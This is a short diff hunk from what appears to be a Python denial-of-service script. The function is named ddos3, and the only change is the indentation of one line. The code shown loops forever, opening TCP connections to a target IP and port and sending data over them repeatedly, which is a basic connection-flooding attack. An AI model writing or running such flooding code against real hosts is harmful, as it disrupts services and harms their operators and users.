@@ -99,7 +99,7 @@ def ddos3():
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	  	s.connect((ip,port))
+	         	s.connect((ip,port))
 			s.send(data)
 			for x in range(times):
 				s.send(data)
